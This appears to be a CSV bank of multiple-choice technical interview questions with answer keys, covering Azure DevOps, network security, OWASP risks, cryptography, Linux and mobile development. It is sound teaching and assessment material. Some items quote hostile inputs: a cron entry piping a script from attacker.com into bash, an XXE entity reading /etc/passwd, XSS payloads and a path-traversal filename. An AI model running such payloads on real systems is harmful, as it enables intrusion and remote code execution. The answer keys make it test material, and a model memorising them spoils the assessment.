question_id,question,topic,subtopic,difficulty,role,option_a,option_b,option_c,option_d,correct_answer,explanation,expected_time,experience_level
AZU014,"Resource locks prevent accidental deletion. After setting CanNotDelete lock, deployment that needs to delete resources fails. What's the architectural consideration?",Cloud basics,Resource Management,hard,Azure Engineer,Remove lock before deployment,Locks prevent even authorized deletions; need lock management in deployment pipeline,Use different lock type,Increase permissions,b,"Locks apply to all users including owners. Automation needs to remove locks, perform operations, then reapply. Build lock management into deployment pipelines.",55,3+
AZU015,"After regional failover, application works but users report stale data. Investigation shows storage failover succeeded but database didn't. Why?",Cloud basics,Disaster Recovery,hard,Azure Engineer,Database not geo-replicated,Storage and database have independent failover mechanisms; database failover must be triggered separately,Network issue,Insufficient permissions,b,Storage account failover and Azure SQL geo-replication are separate. DR plan must coordinate failover of all components. Test full stack failover regularly.,58,3+
AZU016,Cost analysis shows high 'bandwidth' charges. Investigation traces to VNet peering traffic between regions. How to optimize?,Cloud basics,Cost Optimization,hard,Azure Engineer,Disable peering,Redesign to minimize cross-region traffic or use cheaper data transfer options,Use faster network,Compress data,b,"Cross-region VNet peering incurs bandwidth charges. Architect to keep related resources in same region, use caching to reduce data transfer, or evaluate if cross-region is necessary.",60,3+
AZU017,Azure DevOps pipeline deploys to staging but skips production. Both stages use the same service connection. What's likely different?,CI_CD,Pipeline Configuration,easy,Azure Engineer,Service connection expired,Production stage has approval gates or environment checks,Wrong branch,YAML syntax error,b,Production deployments typically require manual approval or environment gates. Pipeline may be waiting for approval to proceed to production stage.,20,0-1
AZU018,Pipeline variable contains database password. You set it as secret. Pipeline logs still show the password. What's wrong?,CI_CD,Secrets Management,easy,Azure Engineer,Secret not saved,Pipeline task explicitly prints the variable bypassing secret masking,Wrong variable type,Permissions issue,b,"Secret variables are masked in logs automatically, but if a task explicitly echoes/prints the variable value (echo $PASSWORD), it appears in logs. Don't explicitly output secrets.",18,0-1
AZU019,Container deployment via Azure DevOps succeeds but application shows old version. Pipeline pushes to ACR with 'latest' tag. What's the issue?,CI_CD,Container Deployment,medium,Azure Engineer,ACR cache,Image pull policy is 'IfNotPresent'; pods don't pull 'latest' if locally cached,Wrong registry,Pipeline failed,b,Using 'latest' tag with IfNotPresent pull policy means Kubernetes won't pull new image if any 'latest' is cached. Use specific tags (SHA or version) and 'Always' pull policy.,40,2-3
AZU020,Pipeline has 3 parallel jobs. One job fails but pipeline shows success. What's the configuration issue?,CI_CD,Pipeline Logic,medium,Azure Engineer,Wrong success criteria,Job uses 'continueOnError: true' allowing pipeline to succeed despite job failure,Parallel job bug,Wrong stage,b,continueOnError: true makes a job optional. Pipeline succeeds even if that job fails. Use for non-critical jobs only; review what should actually block pipeline.,38,2-3
AZU021,Release pipeline to multiple environments shows inconsistent results. Same code deploys successfully to dev but fails in prod with config errors. What's the practice issue?,CI_CD,Configuration Management,medium,Azure Engineer,Production firewall,Environment-specific configuration not properly parameterized or managed,Wrong service connection,Pipeline bug,b,"Configuration should be externalized (variable groups, Key Vault, app config) per environment. Hardcoded or mismatched configs cause environment-specific failures.",42,2-3
AZU022,Self-hosted agent pool for builds. Builds start failing with 'disk full'. Agent has 500GB disk. What's the likely cause?,CI_CD,Agent Management,hard,Azure Engineer,Wrong disk size,Build artifacts and workspace directories accumulate without cleanup,Agent bug,Network storage issue,b,"Self-hosted agents accumulate build artifacts, cached Docker layers, and workspace files. Need automated cleanup jobs or configure workspace cleanup between builds.",55,3+
AZU023,"Multi-stage deployment (dev→staging→prod) uses same ARM template. After deploying new feature to dev, staging deployment fails with 'resource already exists'. Why?",CI_CD,Infrastructure as Code,hard,Azure Engineer,Wrong template,ARM template uses 'Incremental' mode; resource created in dev with global name conflicts in staging,Network issue,Permissions missing,b,"Resources with globally unique names (storage, Key Vault) can't be duplicated. Use environment-specific naming conventions or resource group scoping. Or resource exists from previous deployment that wasn't cleaned up.",58,3+
AZU024,Pipeline uses service principal for deployment. Deployment worked yesterday but fails today with '403 Forbidden'. Service principal credentials haven't changed. What happened?,CI_CD,Authentication,hard,Azure Engineer,Pipeline bug,Service principal secret expired or RBAC role assignment removed/changed,Azure outage,Wrong subscription,b,Service principal secrets expire (default 1-2 years). Also check if someone modified RBAC role assignments removing necessary permissions. Use Managed Identity where possible to avoid secret expiration.,60,3+
CSA001,A network administrator notices unusual traffic on port 3389 from multiple international IP addresses during non-business hours. What type of attack is most likely occurring?,Network Security,Attack Detection,easy,Cybersecurity Analyst,DNS spoofing attack,RDP brute force attack,SQL injection attack,ARP poisoning attack,b,Port 3389 is the default RDP port. Multiple connection attempts from various IPs during off-hours indicates a brute force attack targeting Remote Desktop Protocol.,20,0-1
CSA002,Which firewall configuration creates the highest security risk for internal network resources?,Network Security,Firewall Configuration,easy,Cybersecurity Analyst,Blocking all inbound traffic except on specific allowed ports,Allowing all outbound traffic from internal network,Setting default-deny policy for inbound connections,Allowing any-to-any traffic on the internal network,d,"An any-to-any rule allows unrestricted lateral movement within the network, enabling attackers to easily pivot between compromised systems.",22,0-1
CSA003,A packet capture shows ARP replies with the same MAC address claiming multiple IP addresses. What attack is indicated?,Network Security,Network Attacks,easy,Cybersecurity Analyst,DHCP starvation,ARP spoofing,VLAN hopping,MAC flooding,b,ARP spoofing involves an attacker sending fake ARP replies to associate their MAC address with multiple legitimate IP addresses for man-in-the-middle attacks.,18,0-1
CSA004,"An analyst detects a connection where the SYN, ACK, and FIN flags are all set simultaneously. What is the most likely purpose of this traffic?",Network Security,Network Reconnaissance,medium,Cybersecurity Analyst,Normal TCP handshake completion,Port scanning or firewall evasion,Legitimate connection termination,Network performance optimization,b,Setting multiple incompatible TCP flags simultaneously is characteristic of techniques like XMAS scans used in port scanning or to evade IDS/firewall detection.,30,2-3
CSA005,A company's DNS server receives queries for non-existent subdomains at an unusually high rate. The queries contain encoded data in the subdomain names. What attack is occurring?,Network Security,Data Exfiltration,medium,Cybersecurity Analyst,DNS cache poisoning,DNS tunneling for data exfiltration,DDoS amplification attack,DNS zone transfer attack,b,"DNS tunneling embeds data within DNS queries to exfiltrate information or establish covert channels, often using random-looking subdomains to encode the data.",35,2-3
CSA006,"During incident response, you notice encrypted traffic on port 443 with unusually long session durations (12+ hours) and consistent byte patterns. What should be your primary concern?",Network Security,Threat Detection,medium,Cybersecurity Analyst,Normal HTTPS browsing activity,Potential C2 (Command and Control) beaconing,Legitimate VPN connection,SSL/TLS renegotiation attack,b,"Long-duration encrypted sessions with regular patterns on HTTPS ports often indicate C2 communication, where malware maintains persistent contact with attacker infrastructure.",38,2-3
CSA007,A network architect proposes segmenting the network with VLANs alone (no firewalls between VLANs) to separate production and development environments. Why is this approach insufficient for security?,Network Security,Network Segmentation,hard,Cybersecurity Analyst,VLANs cannot prevent physical access to network equipment,VLAN hopping attacks can bypass logical segmentation without firewall enforcement,VLANs reduce network performance significantly,VLANs are incompatible with modern switching infrastructure,b,"VLANs provide logical separation but can be bypassed through VLAN hopping techniques (switch spoofing, double tagging). Firewalls are needed to enforce security policies between segments.",50,3+
CSA008,"An IDS detects fragmented packets with overlapping offsets targeting a critical server. The fragments, when reassembled, contain exploit code. Why might the attack succeed despite IDS detection?",Network Security,Evasion Techniques,hard,Cybersecurity Analyst,"The IDS detected the attack, so the server is protected","The target system may reassemble fragments differently than the IDS, allowing the exploit through",Fragmented packets cannot contain malicious payloads,IDS systems always block detected attacks automatically,b,Fragment reassembly evasion exploits differences in how IDS and target systems handle overlapping fragments. The IDS may reassemble incorrectly and miss the actual exploit reaching the target.,55,3+
CSA009,A web application returns detailed database error messages to users when invalid input is provided. Which OWASP risk does this primarily expose?,OWASP,Information Disclosure,easy,Cybersecurity Analyst,Broken Access Control,Security Logging and Monitoring Failures,Security Misconfiguration,Injection,c,Exposing detailed error messages revealing database structure or internal system details is a classic security misconfiguration that aids attackers in reconnaissance.,20,0-1
CSA010,An application allows users to access files by directly modifying URL parameters like '/download?file=invoice123.pdf'. What vulnerability should be tested first?,OWASP,Access Control,easy,Cybersecurity Analyst,Cross-Site Request Forgery,Insecure Direct Object Reference,XML External Entity,Server-Side Request Forgery,b,"IDOR vulnerabilities allow attackers to access objects by manipulating file parameters without proper authorization checks, enabling access to other users' files.",22,0-1
CSA011,"A login form accepts username and password but doesn't implement rate limiting. After 1000 failed attempts, an account is successfully compromised. Which OWASP vulnerability was exploited?",OWASP,Authentication,medium,Cybersecurity Analyst,Injection,Identification and Authentication Failures,Security Misconfiguration,Cryptographic Failures,b,"Lack of rate limiting on authentication endpoints allows brute force attacks, which is classified under Identification and Authentication Failures in OWASP Top 10.",30,2-3
CSA012,A web application accepts XML input and processes it without disabling external entity resolution. An attacker submits: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>. What attack is this?,OWASP,XML Processing,medium,Cybersecurity Analyst,XML External Entity (XXE) attack,Cross-Site Scripting,SQL Injection,LDAP Injection,a,"XXE attacks exploit XML parsers that process external entity references, allowing attackers to read local files, perform SSRF, or cause denial of service.",35,2-3
CSA013,An application uses client-side JavaScript to validate that users can only access their own records before sending API requests. Why is this approach vulnerable?,OWASP,Access Control,medium,Cybersecurity Analyst,JavaScript is slower than server-side validation,Client-side controls can be bypassed by manipulating requests directly,JavaScript cannot handle complex authorization logic,Client-side validation uses more bandwidth,b,Client-side security controls can be completely bypassed using browser dev tools or API clients. Authorization must always be enforced server-side.,32,2-3
CSA014,A session token is set with the following cookie attributes: 'Secure; SameSite=Lax'. An attacker on the same network uses HTTP (not HTTPS) to intercept the cookie. What is the outcome?,OWASP,Session Management,medium,Cybersecurity Analyst,The cookie is intercepted because SameSite doesn't prevent network sniffing,The cookie is protected because SameSite=Lax prevents interception,"The cookie is not transmitted over HTTP due to the Secure flag, preventing interception",The cookie can only be intercepted if SameSite=None,c,"The Secure flag ensures cookies are only transmitted over HTTPS, preventing interception on HTTP connections. SameSite protects against CSRF, not network sniffing.",40,2-3
CSA015,"An API implements JWT authentication but doesn't validate the signature on incoming tokens, only decodes and trusts the payload. An attacker modifies the 'role' claim from 'user' to 'admin'. Why does the attack succeed?",OWASP,Cryptographic Failures,hard,Cybersecurity Analyst,JWTs cannot be validated without a signature,"The application fails to verify token integrity, accepting tampered claims",JWT encryption prevents this attack,Role claims cannot be modified in JWTs,b,"JWT signatures ensure integrity. Without signature verification, attackers can modify payload claims freely. The application must validate the signature using the secret key.",50,3+
CSA016,"A web application sanitizes input by blocking <script> tags, but an attacker successfully executes XSS using: <img src=x onerror='alert(1)'>. The application then adds a blacklist for 'onerror'. The attacker bypasses it with: <svg/onload=alert(1)>. What is the fundamental flaw in this security approach?",OWASP,Input Validation,hard,Cybersecurity Analyst,The blacklist should include all HTML tags,Blacklist-based filtering is inherently incomplete; allowlist validation or proper encoding should be used,The application should block all HTML input entirely,Event handlers cannot be blocked effectively,b,"Blacklists are easily bypassed due to the vast number of XSS vectors. Proper defense uses allowlist validation, context-aware output encoding, and Content Security Policy.",55,3+
CSA017,A developer stores user passwords using MD5 hashing without salt. What is the primary weakness of this approach?,Cryptography basics,Password Hashing,easy,Cybersecurity Analyst,MD5 is too slow for password hashing,MD5 is cryptographically broken and rainbow tables can crack unsalted hashes,MD5 cannot hash passwords longer than 16 characters,MD5 requires special hardware to compute,b,"MD5 is vulnerable to collisions and fast to compute. Without salting, identical passwords produce identical hashes, enabling rainbow table attacks.",20,0-1
CSA018,An application encrypts data using AES-256 but hardcodes the encryption key in the source code. What is the critical security flaw?,Cryptography basics,Key Management,easy,Cybersecurity Analyst,AES-256 is not strong enough for production use,"Hardcoded keys can be extracted from the code, compromising all encrypted data",Encryption keys must be at least 512 bits,Source code cannot contain cryptographic operations,b,"Hardcoded keys in source code can be easily extracted through reverse engineering or source code access, rendering the encryption useless.",18,0-1
CSA019,A system uses symmetric encryption (AES) to secure communications between 100 users. How many unique keys are needed for each pair to communicate securely?,Cryptography basics,Key Distribution,easy,Cybersecurity Analyst,100 keys (one per user),"4,950 keys (one per unique pair)",1 key (shared among all users),200 keys (two per user),b,"Symmetric encryption requires a unique shared key for each pair of users: n(n-1)/2 = 100×99/2 = 4,950 keys. This demonstrates symmetric encryption's key distribution challenge.",25,0-1
CSA020,An application uses AES in ECB mode to encrypt user profile images. Identical image blocks produce identical encrypted blocks. What information does this leak?,Cryptography basics,Encryption Modes,medium,Cybersecurity Analyst,The decryption key can be derived from patterns,Visual patterns and structure of the original image remain partially visible,The entire image is completely exposed,No information is leaked; this is normal AES behavior,b,"ECB mode encrypts identical plaintext blocks to identical ciphertext blocks, preserving patterns. This is why ECB should never be used for images or structured data.",35,2-3
CSA021,A messaging app uses RSA public-key cryptography for message encryption. Alice sends Bob her public key over an unencrypted channel. An attacker intercepts and replaces it with their own public key. What attack is this?,Cryptography basics,Public Key Infrastructure,medium,Cybersecurity Analyst,Brute force attack,Man-in-the-Middle attack exploiting lack of key authentication,Replay attack,Collision attack,b,"Without authenticating public keys (via certificates or fingerprint verification), an attacker can substitute their own public key, enabling message decryption.",32,2-3
CSA022,A secure messaging system uses AES-GCM for encryption. What critical advantage does GCM mode provide over CBC mode for this application?,Cryptography basics,Authenticated Encryption,medium,Cybersecurity Analyst,GCM is faster than CBC on all hardware,"GCM provides both encryption and authentication, detecting tampering",GCM uses longer encryption keys,GCM doesn't require initialization vectors,b,"GCM is an authenticated encryption mode providing both confidentiality and integrity. CBC only provides encryption, requiring separate HMAC for authentication.",38,2-3
CSA023,A system generates cryptographic keys using: Math.random() in JavaScript for client-side encryption. An attacker predicts future keys after observing several encrypted messages. Why did this attack succeed?,Cryptography basics,Random Number Generation,hard,Cybersecurity Analyst,JavaScript cannot perform cryptographic operations,"Math.random() uses a predictable PRNG, not a cryptographically secure RNG",Client-side encryption is always insecure,Random number generators cannot be predicted,b,Math.random() is not cryptographically secure and can be predicted. Crypto.getRandomValues() should be used for cryptographic key generation.,48,3+
CSA024,A company implements an encrypted backup system using AES-CBC with a fixed IV (initialization vector) reused across all backups. An attacker obtains two encrypted backups and XORs their first blocks. What information does this reveal?,Cryptography basics,IV Reuse Vulnerability,hard,Cybersecurity Analyst,Nothing; IV reuse doesn't affect security,The encryption key is revealed,"The XOR of the two plaintext first blocks, leaking information about differences",The complete plaintext of both backups,c,"With CBC and reused IV: C1=E(P1⊕IV), C2=E(P2⊕IV). XORing ciphertexts reveals patterns: C1⊕C2 leaks P1⊕P2 structure. IVs must be unique and unpredictable.",60,3+
SEG001,"During code review, you find: query = 'SELECT * FROM users WHERE id = ' + userId. What remediation should be applied?",OWASP,SQL Injection Prevention,easy,Security Engineer,Add input length validation,Use parameterized queries or prepared statements,Encode the userId variable,Add a WAF rule to block SQL keywords,b,"Parameterized queries separate SQL code from data, preventing injection. String concatenation allows attackers to inject malicious SQL regardless of input validation.",22,0-1
SEG002,An API endpoint /api/users/{userId}/profile lacks authorization checks. It only validates that the JWT token is valid. What vulnerability exists?,OWASP,Broken Access Control,easy,Security Engineer,Authentication failure,Broken Object Level Authorization allowing access to other users' profiles,Cryptographic failure,Injection vulnerability,b,Valid authentication doesn't guarantee authorization. The endpoint must verify that the authenticated user is authorized to access the requested userId's profile.,20,0-1
SEG003,A web application reflects user input directly in error messages: 'Error: user <script>alert(1)</script> not found'. What is the immediate security concern?,OWASP,Cross-Site Scripting,medium,Security Engineer,SQL Injection in error handling,Reflected XSS allowing JavaScript execution in user browsers,CSRF token bypass,Authentication bypass,b,Unencoded user input reflected in HTML responses enables reflected XSS attacks. All user input must be context-appropriately encoded before output.,28,2-3
SEG004,You're implementing session management. Which approach provides the strongest security against session hijacking?,OWASP,Session Management,medium,Security Engineer,Use predictable sequential session IDs for easier debugging,"Generate cryptographically random session tokens, use HTTPOnly and Secure flags, implement timeout and rotation",Store session IDs in localStorage for persistence,Use the user's IP address as the session identifier,b,"Secure session management requires cryptographically random tokens, HTTPOnly/Secure cookie flags to prevent XSS/MITM theft, timeouts, and rotation after privilege changes.",35,2-3
SEG005,An application accepts file uploads and stores them with original filenames in the web root. A user uploads '../../etc/passwd'. What attack vector does this enable if not mitigated?,OWASP,Path Traversal,medium,Security Engineer,SQL Injection,Path traversal allowing file overwrite or reading sensitive files,Cross-Site Scripting,SSRF attack,b,"Unvalidated file paths allow directory traversal attacks. Filenames must be sanitized, validated, and ideally replaced with generated names. Files should never be stored in web-accessible directories.",32,2-3
SEG006,You implement Content Security Policy (CSP) with: default-src 'self'; script-src 'unsafe-inline'. What critical weakness remains?,OWASP,CSP Configuration,medium,Security Engineer,External resources cannot be loaded,"'unsafe-inline' allows inline scripts, defeating XSS protection",CSP blocks all JavaScript execution,Images cannot be displayed,b,"The 'unsafe-inline' directive allows inline JavaScript, which negates much of CSP's XSS protection. Use nonces or hashes instead of 'unsafe-inline'.",40,2-3
SEG007,An application deserializes user-provided data using pickle in Python without validation. An attacker sends a crafted payload. What is the most severe potential outcome?,OWASP,Insecure Deserialization,hard,Security Engineer,Application crash only,Remote Code Execution allowing complete system compromise,Limited data disclosure,Session fixation,b,Pickle and similar deserialization mechanisms can execute arbitrary code during deserialization. Never deserialize untrusted data. Use safe formats like JSON with schema validation.,50,3+
SEG008,"A microservices architecture implements JWT for inter-service authentication. Service A validates tokens, but Service B (internal-only) doesn't, assuming it's protected by network segmentation. An attacker compromises Service A. What is the security impact?",OWASP,Security Architecture,hard,Security Engineer,No impact; network segmentation provides sufficient security,"The attacker can forge requests to Service B without authentication, enabling lateral movement",Only Service A is compromised; internal services are safe,JWT automatically prevents this scenario,b,"Zero-trust principles require every service to validate authentication, even internal ones. Network segmentation alone is insufficient; defense-in-depth requires authentication at every boundary.",55,3+
SEG009,"A company's firewall logs show repeated connection attempts to port 22 from a single IP. After 500 attempts, the connection succeeds. What security control was missing?",Network Security,Brute Force Protection,easy,Security Engineer,Encryption,Rate limiting or IP blocking after failed attempts,Firewall configuration,Network segmentation,b,Failed authentication attempts should trigger rate limiting or temporary IP blocking. Tools like fail2ban can automatically block IPs after repeated failed SSH attempts.,20,0-1
SEG010,You configure a web server to use TLS 1.0 for backward compatibility. What security risk does this introduce?,Network Security,Encryption Protocols,easy,Security Engineer,No risk; TLS 1.0 is secure,"TLS 1.0 has known vulnerabilities (BEAST, POODLE-like attacks) and weak cipher support",TLS 1.0 cannot encrypt data,TLS 1.0 is faster but less compatible,b,"TLS 1.0 and 1.1 have known vulnerabilities and should be disabled. Modern systems should enforce TLS 1.2 minimum, preferably TLS 1.3.",22,0-1
SEG011,Network monitoring shows a sudden spike in DNS queries for random subdomains of your domain from internal hosts. What should be investigated first?,Network Security,Threat Detection,easy,Security Engineer,Normal user browsing behavior,Possible DNS tunneling or data exfiltration malware,DNS server performance issues,Legitimate software update checks,b,Unusual patterns of random subdomain queries often indicate DNS tunneling used for C2 communication or data exfiltration. Investigate the source hosts for compromise.,25,0-1
SEG012,You're designing a DMZ architecture. Where should you place the database server storing customer PII?,Network Security,Network Architecture,medium,Security Engineer,In the DMZ with web servers for faster access,"In the internal network behind the DMZ, accessible only from application servers",On the public internet with VPN access,Co-located with the firewall,b,"Database servers with sensitive data should be in the internal network, not the DMZ. DMZ hosts web/app servers; databases should only be accessible from trusted application tier.",30,2-3
SEG013,Your IDS detects traffic with both SYN and RST flags set from an external IP scanning multiple ports. What is the attacker likely attempting to determine?,Network Security,Port Scanning,medium,Security Engineer,Network bandwidth availability,Firewall rule set and port accessibility while evading detection,Legitimate connection establishment,DNS server configuration,b,Malformed TCP flags (SYN+RST) are used in stealth scans to probe firewall rules and open ports while attempting to evade IDS signatures that look for normal SYN scans.,35,2-3
SEG014,You implement VPN for remote access using PPTP protocol. What critical security weakness should concern you?,Network Security,VPN Security,medium,Security Engineer,PPTP is too slow for modern networks,PPTP has cryptographic weaknesses and can be cracked; use OpenVPN or IPSec instead,PPTP cannot traverse firewalls,PPTP requires expensive licensing,b,"PPTP uses weak encryption (MS-CHAPv2) that can be cracked in hours. Modern VPNs should use OpenVPN, WireGuard, or IPSec with strong ciphers.",38,2-3
SEG015,"A company implements port knocking to protect SSH access. The knock sequence is 1234, 5678, 9012. An attacker captures this sequence via packet sniffing. Why does the security mechanism fail?",Network Security,Access Control,hard,Security Engineer,Port numbers are too predictable,Port knocking without time-based or encrypted elements is vulnerable to replay attacks,SSH cannot be protected by port knocking,The sequence should be longer,b,"Static port knock sequences can be captured and replayed. Secure implementations require time-based one-time sequences, encryption, or combine port knocking with additional authentication.",50,3+
SEG016,"An organization deploys an IPS in inline blocking mode. During a DDoS attack, the IPS becomes overwhelmed and starts dropping legitimate traffic. How should the security architecture be improved to prevent this failure mode?",Network Security,Defense Architecture,hard,Security Engineer,Remove the IPS entirely,"Implement DDoS mitigation (rate limiting, traffic scrubbing) upstream before IPS, with IPS bypass capability",Increase IPS hardware specifications only,Switch to IDS monitoring mode only,b,"Defense-in-depth requires volumetric DDoS mitigation upstream (CDN, scrubbing centers). IPS should have fail-open capability and focus on application-layer threats, not volumetric attacks.",55,3+
SEG017,A file has permissions '-rwsr-xr-x' and is owned by root. What security risk does the 's' bit introduce?,Linux,File Permissions,easy,Security Engineer,The file cannot be executed,"The file runs with root privileges (SUID), potential privilege escalation if vulnerable",The file is encrypted,The file is shared across the network,b,SUID bit (s) makes executables run with the file owner's privileges. Root-owned SUID binaries are high-value targets for privilege escalation attacks.,20,0-1
SEG018,You find a suspicious cron job: '* * * * * curl http://attacker.com/script.sh | bash'. What is this doing?,Linux,Persistence Mechanisms,easy,Security Engineer,Legitimate system update,"Downloads and executes a remote script every minute, likely a backdoor",Scheduled backup operation,System monitoring script,b,"This cron job downloads and executes arbitrary code from an external server every minute, creating a persistent backdoor. Immediate investigation and remediation required.",22,0-1
SEG019,Which command would you use to find all files modified in the last 24 hours for forensic investigation?,Linux,Forensics,easy,Security Engineer,ls -la,find / -mtime -1,grep -r modified,chmod -R 777,b,"The find command with -mtime -1 locates files modified in the last 24 hours, useful for incident response to identify attacker-modified files.",18,0-1
SEG020,"During incident response, you discover /tmp/.hidden/malware running. You kill the process, but it respawns immediately. What should you check next?",Linux,Incident Response,medium,Security Engineer,Network connectivity only,"Systemd services, cron jobs, and init scripts for persistence mechanisms",User login history,Disk space usage,b,"Auto-respawning processes indicate persistence mechanisms. Check systemd services (/etc/systemd/system/), crontabs (/etc/cron*), init.d, rc.local, and user-level autostart configurations.",35,2-3
SEG021,You harden a Linux server and set /etc/passwd permissions to 600 (rw-------). What critical functionality breaks?,Linux,System Hardening,medium,Security Engineer,SSH login works normally,User authentication and many services fail because /etc/passwd must be world-readable (644),"Only root can login, which is the desired outcome",File permissions have no effect on /etc/passwd,b,/etc/passwd must be world-readable (644) for username/UID lookups. Sensitive password hashes are in /etc/shadow (640). Making passwd 600 breaks authentication and system services.,32,2-3
SEG022,A user reports 'Permission denied' when accessing their own file despite 'ls -l' showing 'rw-r--r--'. The file is on an NFS mount. What is the likely cause?,Linux,Network File Systems,medium,Security Engineer,The file is corrupted,NFS user/group ID mapping mismatch or root_squash configuration,SELinux is blocking access,The file is too large,b,"NFS permission issues often stem from UID/GID mismatches between client and server, or root_squash mapping root to nobody. Check /etc/exports and ID mapping.",40,2-3
SEG023,"You implement AppArmor to confine a web application, but it still accesses /etc/shadow despite your profile denying it. You verify the profile is loaded. What could allow this bypass?",Linux,Mandatory Access Control,hard,Security Engineer,AppArmor cannot protect system files,"The profile is in complain mode rather than enforce mode, or the application has CAP_MAC_OVERRIDE capability",File permissions override AppArmor,AppArmor only works with SELinux,b,"AppArmor profiles in complain mode log violations without enforcing. Also, CAP_MAC_OVERRIDE capability allows MAC bypass. Verify: aa-status shows enforce mode, and check process capabilities.",52,3+
SEG024,"An attacker exploits a buffer overflow in a service running as a restricted user. Despite ASLR being enabled, they achieve reliable code execution. You discover the executable is compiled without PIE (Position Independent Executable). Why does this defeat ASLR?",Linux,Exploit Mitigation,hard,Security Engineer,ASLR doesn't work on Linux systems,"Without PIE, the executable's base address is fixed, providing attackers with reliable ROP gadget addresses",Buffer overflows cannot be prevented by ASLR,Restricted users bypass ASLR automatically,b,"ASLR randomizes library addresses, but without PIE, the main executable loads at a fixed address. Attackers can use gadgets from the executable for ROP chains. Compile with -fPIE -pie.",58,3+
MAD001,"In mobile development, what happens when an app processes a long-running operation on the main thread without using asynchronous operations?",Mobile Development,Threading & Performance,easy,Mobile App Developer,The operation runs faster because it skips async overhead,The UI becomes unresponsive and users see a frozen screen,The app automatically distributes work to background threads,The battery drains slower because no context switching occurs,b,"Long operations on the main thread block UI updates, causing the ANR (Application Not Responding) dialog. Always use background threads for heavy work.",20,0-1
MAD002,What is the primary risk of storing sensitive user data (like passwords or tokens) directly in app preferences or shared preferences without encryption?,Mobile Development,Security,easy,Mobile App Developer,It increases the app's performance because encryption is slow,The data is vulnerable to access by other apps or rooted devices,It prevents the app from being updated,It reduces the app's battery life significantly,b,Unencrypted sensitive data in shared preferences can be accessed by other apps with the same UID or attackers with device access. Always use secure storage mechanisms like Keystore.,22,0-1
MAD003,"A mobile app displays a list of 10,000 items using a simple loop to create and render each UI element immediately. What performance issue will users experience?",Mobile Development,Performance Optimization,easy,Mobile App Developer,"The app crashes because 10,000 is beyond the limit",The app takes excessive time to load and becomes unresponsive,Only the first 100 items display correctly,The app automatically optimizes and shows all items instantly,b,"Creating 10,000 UI elements upfront causes massive memory allocation and rendering delays. Use virtualization (lazy loading/recycling views) to render only visible items.",19,0-1
MAD004,"When a user rotates their mobile device, the app state is lost and the UI resets to default values. What lifecycle concept is being mishandled?",Mobile Development,Lifecycle Management,easy,Mobile App Developer,The activity is being destroyed without saving instance state,The app doesn't support rotation,Rotation is not a valid lifecycle event,The user's device has low memory,a,Device rotation triggers activity recreation. State must be saved in onSaveInstanceState() or persisted to survive configuration changes.,21,0-1
MAD005,A developer creates a reference to an Activity in a static variable to access it globally. What hidden problem might occur after the activity is destroyed?,Mobile Development,Memory Management,easy,Mobile App Developer,The static variable automatically becomes null,"The static reference prevents the activity from being garbage collected, causing a memory leak",Static variables don't affect activity lifecycle,The app automatically releases the memory after 5 seconds,b,"Static references persist beyond the activity's lifecycle, preventing garbage collection. This is a classic memory leak pattern. Always use weak references for context.",23,0-1
MAD006,An app makes network requests without checking if the device is connected to the internet. What will likely happen?,Mobile Development,Network Handling,easy,Mobile App Developer,The network automatically retries indefinitely until connection is restored,The request fails silently and the user doesn't know why,The app crashes immediately,The request is queued and automatically sent when connected,b,"Without connectivity checks, requests fail without user feedback. Always check network status and provide proper error handling and offline-first strategies.",20,0-1
MAD007,A background service continues running even after the user closes the app from recent tasks. Is this expected behavior?,Mobile Development,Background Processes,easy,Mobile App Developer,"Yes, services always run indefinitely once started","No, services can be killed by the system or stopped when the app is closed",Services only run when the app is in foreground,It depends on whether the user has root access,b,Services can be terminated by the system under memory pressure or when swiped from recent tasks. Use foreground services or WorkManager for persistent tasks.,22,0-1
MAD008,What typically indicates that an app is leaking memory rather than just using memory normally?,Mobile Development,Debugging & Profiling,easy,Mobile App Developer,Memory usage increases over time even without new features being used,The app uses more than 64MB of RAM,The app has more than 1000 objects in memory,Memory usage stays constant throughout the app lifecycle,a,Memory leaks cause memory usage to continuously grow. Normal memory usage may fluctuate but shouldn't show persistent growth. Use Android Profiler to detect leaks.,21,0-1
MAD009,"A mobile app requests permissions at installation time on Android 6.0+, but the user can still deny them later. What permission model is being used?",Mobile Development,Permissions & Privacy,easy,Mobile App Developer,Old manifest-only permission model,Runtime permissions that can be granted or revoked individually,Deprecated legacy permission system,Automatic permission grants that cannot be revoked,b,"Android 6.0+ uses runtime permissions. Permissions must be requested at runtime, and users can revoke them anytime. Always check permissions before accessing protected resources.",20,0-1
